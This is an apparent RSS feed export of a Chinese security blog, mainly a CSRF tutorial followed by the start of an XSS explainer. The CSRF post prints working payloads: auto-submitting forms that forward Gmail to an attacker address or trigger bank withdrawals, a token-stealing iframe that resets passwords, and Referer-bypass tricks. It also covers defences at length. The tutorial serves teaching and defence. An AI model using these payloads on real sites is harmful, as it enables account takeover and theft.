class="built_in">document</span>.body.appendChild(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">solveSum</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;answer&quot;</span> <span class="keyword">in</span> obj) &#123;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;answer&quot;</span>).innerHTML = obj[<span class="string">&#x27;answer&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> solve_button = <span class="built_in">document</span>.getElementById (<span class="string">&quot;solve&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (solve_button) &#123;</span><br><span class="line">solve_button.addEventListener(<span class="string">&quot;click&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">clickButton();</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>source/jsonp_impossible.php</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里没有参数值接受参数也就无法输出js代码。</span></span><br><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">&quot;Content-Type: application/json; charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">$outp = array (<span class="string">&quot;answer&quot;</span> =&gt; <span class="string">&quot;15&quot;</span>);</span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;solveSum (&quot;</span>.json_encode($outp).<span class="string">&quot;)&quot;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;同源策略&quot;&gt;&lt;a href=&quot;#同源策略&quot; class=&quot;headerlink&quot; title=&quot;同源策略&quot;&gt;&lt;/a&gt;同源策略&lt;/h2&gt;&lt;h5 id=&quot;什么是跨域&quot;&gt;&lt;a href=&quot;#什么是跨域&quot; class=&quot;headerlink&quot; title=&quot;什么是跨域?&quot;</summary>
      
    
    
    
    <category term="前端安全" scheme="http://s1eady.top/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="OWSP-TOP10" scheme="http://s1eady.top/tags/OWSP-TOP10/"/>
    
  </entry>
  
  <entry>
    <title>CSRF漏洞</title>
    <link href="http://s1eady.top/2019/01/08/CSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>http://s1eady.top/2019/01/08/CSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2019-01-08T09:12:08.000Z</published>
    <updated>2020-10-16T11:46:13.798Z</updated>
    
    <content type="html"><![CDATA[<h3 id="CSRF漏洞总结"><a href="#CSRF漏洞总结" class="headerlink" title="CSRF漏洞总结"></a>CSRF漏洞总结</h3><h4 id="Gmail的CSRF漏洞"><a href="#Gmail的CSRF漏洞" class="headerlink" title="Gmail的CSRF漏洞"></a>Gmail的CSRF漏洞</h4><p>黑客诱惑受害者点击藏有恶意代码的空白页面</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">&quot;POST&quot;</span> action=<span class="string">&quot;https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt; </span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;cf2_emc&quot;</span> value=<span class="string">&quot;true&quot;</span>/&gt; </span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;cf2_email&quot;</span> value=<span class="string">&quot;hacker@hakermail.com&quot;</span>/&gt; </span><br><span class="line">    .....</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;irf&quot;</span> value=<span class="string">&quot;on&quot;</span>/&gt; </span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;nvp_bu_cftb&quot;</span> value=<span class="string">&quot;Create Filter&quot;</span>/&gt; </span><br><span class="line">&lt;/form&gt; </span><br><span class="line">&lt;script&gt; </span><br><span class="line">    document.forms[<span class="number">0</span>].submit();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这个页面只要打开，就会向Gmail发送一个post请求。请求中，执行了”Create Filter”命令，将所有的邮件，转发到”<a href="mailto:&#104;&#97;&#99;&#x6b;&#101;&#114;&#64;&#104;&#97;&#x6b;&#101;&#x72;&#109;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#109;">&#104;&#97;&#99;&#x6b;&#101;&#114;&#64;&#104;&#97;&#x6b;&#101;&#x72;&#109;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#109;</a>“。</p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。</p><ul><li><p>受害者登录a.com，并保留了登录凭证（Cookie）。</p></li><li><p>攻击者引诱受害者访问了b.com。</p></li><li><p>b.com伪装受害者的身份向c.com 发送了一个请求。</p></li><li><p>c.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。</p></li><li><p>攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让c.com执行了自己定义的操作。</p></li></ul><h4 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h4><h5 id="GET类型的CSRF"><a href="#GET类型的CSRF" class="headerlink" title="GET类型的CSRF"></a>GET类型的CSRF</h5><p>只需要一个HTTP请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;bank.example&#x2F;withdraw?amount&#x3D;10000&amp;for&#x3D;hacker&quot; &gt; </span><br></pre></td></tr></table></figure><p>在受害者访问含有这个img的页面后，浏览器会自动向<code>http://bank.example/withdraw?account=xiaoming&amp;amount=10000&amp;for=hacker</code>发出一次HTTP请求。bank.example就会收到包含受害者登录信息的一次跨域请求。</p><h5 id="POST类型的CSRF"><a href="#POST类型的CSRF" class="headerlink" title="POST类型的CSRF"></a>POST类型的CSRF</h5><p>使用的是一个自动提交的表单</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;form action=<span class="string">&quot;http://bank.example/withdraw&quot;</span> method=POST&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;account&quot;</span> value=<span class="string">&quot;xiaoming&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;amount&quot;</span> value=<span class="string">&quot;10000&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;for&quot;</span> value=<span class="string">&quot;hacker&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; </span><br></pre></td></tr></table></figure><p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。以上两个类型不需要用户去操作，会在用户不知情的情况下自动提交请求。</p><h5 id="链接类型的CSRF"><a href="#链接类型的CSRF" class="headerlink" title="链接类型的CSRF"></a>链接类型的CSRF</h5><p>此类CSRF需要用户交互，必须用户有意识到去点击恶意连接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;test.com&#x2F;csrf&#x2F;withdraw.php?amount&#x3D;1000&amp;for&#x3D;hacker&quot; taget&#x3D;&quot;_blank&quot;&gt;领取200红包&lt;a&#x2F;&gt;</span><br></pre></td></tr></table></figure><h4 id="漏洞特点"><a href="#漏洞特点" class="headerlink" title="漏洞特点"></a>漏洞特点</h4><ul><li>攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。</li><li>攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据。</li><li>整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。</li><li>跨站请求可以用各种方式：图片URL、超链接、CORS、Form提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。</li></ul><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>1、无需任何验证即可删除某社区的帖子</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//zone.wooyun.org/index.php?do=edit&amp;act=delcomment&amp;fun=ajax&amp;id=311946</span></span><br></pre></td></tr></table></figure><p>2、用户在快速登录(qq、微信)之后,网站要求重新填写用户名、密码、邮箱等信息</p><p>3、网站个人后台修改密码时候无验证码、旧密码、表单token认证等操作</p><p>4、敏感操作:</p><p>刷粉丝、花钱购买图书章节阅读权限、恶意打赏、恶意刷评论</p><h4 id="利用payload"><a href="#利用payload" class="headerlink" title="利用payload"></a>利用payload</h4><p>1、get型–构造url</p><p>2、post型–burp可以直接生成poc</p><p>3、结合存储型xss,存放我们的csrfpoc</p><h4 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h4><h5 id="1、Token绕过"><a href="#1、Token绕过" class="headerlink" title="1、Token绕过"></a>1、Token绕过</h5><p>页面表单会生成一个token,执行操作的时候需要带上token</p><ul><li><p>结合xss–将我们构造好的代码插入目标网站,获取用户当前的cookie、token等信息,发送到我们的网站</p><ul><li>attach()函数用于获取user_token</li><li>一个iframe标签用于隐藏访问获取一个Token</li><li>一个form表单用于将修改的密码与Token进行提交数据库</li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="function">function <span class="title">attack</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    document.getElementsByName(<span class="string">&#x27;user_token&#x27;</span>)[<span class="number">0</span>].<span class="keyword">value</span>=document.getElementById(<span class="string">&quot;hack&quot;</span>).contentWindow.document.getElementsByName(<span class="string">&#x27;user_token&#x27;</span>)[<span class="number">0</span>].<span class="keyword">value</span>;</span><br><span class="line">    document.getElementById(<span class="string">&quot;transfer&quot;</span>).submit();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;iframe src=<span class="string">&quot;http://192.168.0.1/xxx&quot;</span> id=<span class="string">&quot;hack&quot;</span> border=<span class="string">&quot;0&quot;</span> style=<span class="string">&quot;display:none;&quot;</span>&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line">&lt;body onload=<span class="string">&quot;attack()&quot;</span>&gt;</span><br><span class="line">&lt;form method=<span class="string">&quot;GET&quot;</span> id=<span class="string">&quot;transfer&quot;</span> action=<span class="string">&quot;http://192.168.0.109/xxx&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;password_new&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;password&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;password_conf&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;password&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;user_token&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;Change&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;Change&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure></li><li><p>token在url中可见+请求包的referer字段</p><p>让用户访问我们自己的网站,从用户的请求包中的referer字段拿到用户的token</p></li><li><p>使用JSONP跨域去请求Token</p><ul><li>前提<ul><li>请求是不检查Referer</li><li>使用JSONP去跨域生成Token</li><li>回传参数可以得出，默认为callback</li><li>能够fuzz出一定回调参数的值</li></ul></li><li>利用:构造callback的值,发送JSONP请求,获取Token,进行表单构造利用,引诱点击<ul><li>▲ Token的值也可能与其他参数有关</li></ul></li></ul></li></ul><h5 id="2、referer绕过"><a href="#2、referer绕过" class="headerlink" title="2、referer绕过"></a>2、referer绕过</h5><p>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问<code> http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</code>，用户必须先登陆 bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求</p><ul><li><p>目标站判断了referer是否正确,但是对无referer的情况没有作出判断,逻辑上出现错误</p><ul><li><p>csrfpoc使用html代码</p><p><code>&lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;</code></p><p>比如</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;meta name=<span class="string">&quot;referrer&quot;</span> content=<span class="string">&quot;never&quot;</span>&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)&lt;/script&gt;  &lt;!-- 实现浏览器页面不刷新修改url链接 --&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;http://www.baidu.com/setProfile&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;nickname&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;new22&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;email&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;1&amp;#64;1&amp;#46;com&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;team&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;new22&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;address&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;new33&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;submit&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li><p>用户可以设置浏览器不传递referer</p></li><li><p>使用协议绕过</p><p>利用<code>ftp://,http://,https://,file://,javascript:,data:</code>这个时候浏览器地址栏是<code>file://</code>开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。</p><ul><li><p>利用data:协议</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;iframe src=<span class="string">&quot;data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==&quot;</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">payload:</span><br><span class="line">&lt;form method=post action=http:<span class="comment">//a.b.com/d&gt;&lt;input type=text name=&#x27;id&#x27; value=&#x27;123&#x27;/&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>利用https协议</p><p>https向http跳转的时候Referer为空</p><p>payload在https环境下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;https:&#x2F;&#x2F;xxxxx.xxxxx&#x2F;attack.php&quot;&gt;</span><br></pre></td></tr></table></figure><p> attack.php写上CSRF攻击代码</p></li></ul></li><li><p>Referrer Policy</p><p>隐藏referrer</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;steady.com&quot; referrerpolicy&#x3D;&quot;no-referrer&quot;&gt; </span><br></pre></td></tr></table></figure></li><li><p>IE6、7下使用window.location.href=url、window.open进行界面的跳转，会丢失Referer。</p></li></ul></li><li><p>绕过后台逻辑判断</p><p>可以在我们的恶意url中添加上后台指定的url(把对方指定的url名字变成我们的文件夹名字)</p></li></ul><h5 id="3、jsonp跨域劫持"><a href="#3、jsonp跨域劫持" class="headerlink" title="3、jsonp跨域劫持"></a>3、jsonp跨域劫持</h5><p>通过发起jsonp请求，拿到服务端发回的token</p><h4 id="防御思路"><a href="#防御思路" class="headerlink" title="防御思路"></a>防御思路</h4><h5 id="1、验证码"><a href="#1、验证码" class="headerlink" title="1、验证码"></a>1、验证码</h5><p>优点：</p><p>验证码类型日新月异,各种技术层出不穷。可以很好的防止CSRF</p><p>缺点：</p><p>无法大量部署。影响用户体验。不能每一步都加上验证码。</p><h5 id="2、二次验证"><a href="#2、二次验证" class="headerlink" title="2、二次验证"></a>2、二次验证</h5><p><strong>检查请求来源</strong></p><p>优点:</p><p>检查请求来源的主要方式为 Referer、Origin，就是 HTTP 请求头的那个（两者比较类似，下面仅以 Referer 为例）。Referer 最常见的应用实际上是防盗链。比如我的博客就有。防盗链利用了 referer 检查请求的来源，同样也可以利用来防御 CSRF。</p><p>缺点:</p><ul><li>用户为了保护隐私，自己阻止了浏览器发送 referer</li><li>攻击者可以让自己的页面不发送 referer：<meta name="referer" content="never">这个代码告诉浏览器，所有从当前页面中发起的请求都不要携带 referer</li><li>HTTPS 转为 HTTP 的时候，浏览器出于安全的考虑，不发送 referer。例如网站中有<meta name="referrer" content="default">，如果当前页面使用的是 HTTPS，而正要加载的资源使用的是 HTTP，则将 HTTP header 中的 referer 置空。但是如果是 content=”always” 的话，浏览器会把 HTTPS 的 referer 带给 HTTP 的页面</li><li>如果添加referer并且目标页面token是get形式发送(在url中可见),我们伪造一个页面让别人从目标站来访问我们自己的页面,在请求头中的referer能够带上token,导致token泄漏</li></ul><h5 id="3、Token"><a href="#3、Token" class="headerlink" title="3、Token"></a>3、Token</h5><p>那么我们可以要求所有的用户请求都携带一个CSRF攻击者无法获取到的Token。服务器通过校验请求是否携带正确的Token，来把正常的请求和攻击的请求区分开，也可以防范CSRF的攻击。</p><p>CSRF Token的防护策略分为三个步骤：</p><p>1.将CSRF Token输出到页面中</p><p>Token不能放在cookie中，容易被获取，最好放在服务端到session中。之后在每次页面加载时，使用JS遍历整个DOM树，对于DOM中所有的a和form标签后加入Token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的HTML代码，这种方法就没有作用，还需要程序员在编码时手动添加Token。</p><p>2.页面提交的请求携带这个Token</p><p>对于GET请求，Token将附在请求地址之后。</p><p>对于 POST 请求来说，要在 form 的最后加上。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type&#x3D;”hidden” name&#x3D;”csrftoken” value&#x3D;”tokenvalue”&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>3.服务器验证Token是否正确</p><p>Token的分布式校验</p><p>Session默认存储在单机服务器内存中，因此在分布式环境下同一个用户发送的多次HTTP请求可能会先后落到不同的服务器上，导致后面发起的HTTP请求无法拿到之前的HTTP请求存储在服务器中的Session数据，从而使得Session机制在分布式环境下失效，因此在分布式集群中CSRF Token需要存储在Redis之类的公共存储空间。为此解决办法是Token是一个计算出来的结果，而非随机生成的字符串。这样在校验时无需再去读取存储的Token，只用再次计算一次即可。</p><h5 id="4、同源检测"><a href="#4、同源检测" class="headerlink" title="4、同源检测"></a>4、同源检测</h5><p>服务器可以通过解析这两个Header–Origin Header、Referer Header中的域名，确定请求的来源域。</p><p>注意：</p><p>IE11同源策略： IE 11 不会在跨站CORS请求上添加Origin标头，Referer头将仍然是唯一的标识。</p><p>302重定向： 在302重定向之后Origin不包含在重定向的请求中，因为Origin可能会被认为是其他来源的敏感信息。对于302重定向的情况来说都是定向到新的服务器上的URL，因此浏览器不想将Origin泄漏到新的服务器上。</p><p>Referer：对于Ajax请求，图片和script等资源请求，Referer为发起请求的页面地址。对于页面跳转，Referer为打开页面历史记录的前一个页面地址。因此我们使用Referer中链接的Origin部分可以得知请求的来源域名。</p><p>如果攻击者有权限在本域发布评论（含链接、图片等，统称UGC），那么它可以直接在本域发起攻击，这种情况下同源策略无法达到防护的作用。</p><h5 id="5、双重cookie"><a href="#5、双重cookie" class="headerlink" title="5、双重cookie"></a>5、双重cookie</h5><p>双重Cookie采用以下流程：</p><ul><li>在用户访问网站页面时，向请求域名注入一个Cookie，内容为随机字符串（例如<code>csrfcookie=v8g9e4ksfhw</code>）。</li><li>在前端向后端发起请求时，取出Cookie，并添加到URL的参数中（接上例<code>POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhw</code>）。</li><li>后端接口验证Cookie中的字段与URL参数中的字段是否一致，不一致则拒绝。</li></ul><h5 id="6、Samesite-Cookie属性"><a href="#6、Samesite-Cookie属性" class="headerlink" title="6、Samesite Cookie属性"></a>6、Samesite Cookie属性</h5><p>Google起草了一份草案来改进HTTP协议，那就是为Set-Cookie响应头新增Samesite属性，它用来标明这个 Cookie是个“同站 Cookie”，同站Cookie只能作为第一方Cookie，不能作为第三方Cookie，Samesite 有两个属性值，分别是 Strict 和 Lax。</p><p>Samesite=Strict</p><p>严格模式，表明这个 Cookie 在任何情况下都不可能作为第三方 Cookie，绝无例外。</p><p>淘宝网站用来识别用户登录与否的 Cookie 被设置成了 Samesite=Strict，那么用户从百度搜索页面甚至天猫页面的链接点击进入淘宝后，淘宝都不会是登录状态，因为淘宝的服务器不会接受到那个 Cookie，其它网站发起的对淘宝的任意请求都不会带上那个 Cookie。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: foo&#x3D;1; Samesite&#x3D;Strict</span><br><span class="line">Set-Cookie: bar&#x3D;2; Samesite&#x3D;Lax</span><br><span class="line">Set-Cookie: baz&#x3D;3</span><br></pre></td></tr></table></figure><p>在 <a href="http://a.com/">a.com</a> 下发起对 <a href="http://b.com/">b.com</a> 的任意请求，foo 这个 Cookie 都不会被包含在 Cookie 请求头中，但 bar 会。</p><p>Samesite=Lax</p><p>宽松模式，比 Strict 放宽了点限制：假如这个请求是这种请求（改变了当前页面或者打开了新页面）且同时是个GET请求，则这个Cookie可以作为第三方Cookie。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: foo&#x3D;1; Samesite&#x3D;Strict</span><br><span class="line">Set-Cookie: bar&#x3D;2; Samesite&#x3D;Lax</span><br><span class="line">Set-Cookie: baz&#x3D;3</span><br></pre></td></tr></table></figure><p>当用户从 <a href="http://a.com/">a.com</a> 点击链接进入 <a href="http://b.com/">b.com</a> 时，foo 这个 Cookie 不会被包含在 Cookie 请求头中，但 bar 和 baz 会，也就是说用户在不同网站之间通过链接跳转是不受影响了。但假如这个请求是从 <a href="http://a.com/">a.com</a> 发起的对 <a href="http://b.com/">b.com</a> 的异步请求，或者页面跳转是通过表单的 post 提交触发的，则bar也不会发送。</p><p>该设置有个缺点，topic.a.com下的Cookie，并不能使用a.com下种植的SamesiteCookie。这就导致了当我们网站有多个子域名时，不能使用SamesiteCookie在主域名存储用户登录信息。每个子域名都需要用户重新登录一次。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;CSRF漏洞总结&quot;&gt;&lt;a href=&quot;#CSRF漏洞总结&quot; class=&quot;headerlink&quot; title=&quot;CSRF漏洞总结&quot;&gt;&lt;/a&gt;CSRF漏洞总结&lt;/h3&gt;&lt;h4 id=&quot;Gmail的CSRF漏洞&quot;&gt;&lt;a href=&quot;#Gmail的CSRF漏洞&quot; cla</summary>
      
    
    
    
    <category term="前端安全" scheme="http://s1eady.top/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="OWSP-TOP10" scheme="http://s1eady.top/tags/OWSP-TOP10/"/>
    
  </entry>
  
  <entry>
    <title>xss漏洞</title>
    <link href="http://s1eady.top/2018/12/26/xss/"/>
    <id>http://s1eady.top/2018/12/26/xss/</id>
    <published>2018-12-26T02:46:32.000Z</published>
    <updated>2020-10-16T11:45:55.987Z</updated>
    
    <content type="html"><![CDATA[<h4 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h4><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。</p><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ul><li>窃取 Cookie 信息：通过恶意 js 脚本获取 Cookie 信息，然后通过 ajax 加上 CORS 功能将数据发送给恶意服务器，恶意服务器拿到用户的 Cookie 信息之后，就可以模拟用户的登录，然后进行账户操作。</li><li>监听用户行为：通过恶意 js 脚本，可以做到监听用户各种事件，比如获取登陆的键入字符串完成 hack 用户信息。</li><li>更改 DOM 结构：比较常见的就是通过运营商或者路由器添加浮窗广告，增收自身收入。</li></ul><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><h5 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h5><h6 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h6><p>只发生一次攻击，攻击代码不经过数据库，恶意代码提交到服务器，服务器解析并响应，浏览器最后执行恶意代码</p><h6 id="常见漏洞位置"><a href="#常见漏洞位置" class="headerlink" title="常见漏洞位置"></a>常见漏洞位置</h6><p>网站搜索框、用户登录入口、注入表单的地方。</p><h5 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h5><h6 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h6><p>可发生多次攻击，攻击者利用各种办法把恶意代码存储在受害者的数据库中，当用户每次取出恶意数据的时候出发恶意代码。</p><h6 id="常见漏洞位置-1"><a href="#常见漏洞位置-1" class="headerlink" title="常见漏洞位置"></a>常见漏洞位置</h6><p>论坛、博客等留言位置、评论位置。</p><h5 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h5><p>原理</p><p>DOM（Document Object Model）即文档对象模型，通过 JavaScript，您可以重构整个HTML文档。您可以添加、移除、改变或重排页面上的项目。要改变页面的某个东西。对HTML 